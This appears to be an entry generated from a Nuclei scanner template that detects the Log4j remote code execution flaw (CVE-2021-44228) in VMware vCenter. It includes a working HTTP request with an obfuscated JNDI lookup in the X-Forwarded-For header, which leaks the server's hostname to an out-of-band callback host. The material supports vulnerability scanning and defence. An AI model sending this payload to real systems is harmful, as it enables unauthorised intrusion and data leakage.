# Nuclei Template: VMware VCenter - Remote Code Execution (Apache Log4j)
**Template ID:** vmware-vcenter-log4j-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`vmware-vcenter-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware VCenter is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: {{Hostname}}
X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
```

## References
- https://www.vmware.com/security/advisories/VMSA-2021-0028.html
- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
- https://twitter.com/tnpitsecurity/status/1469429810216771589
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
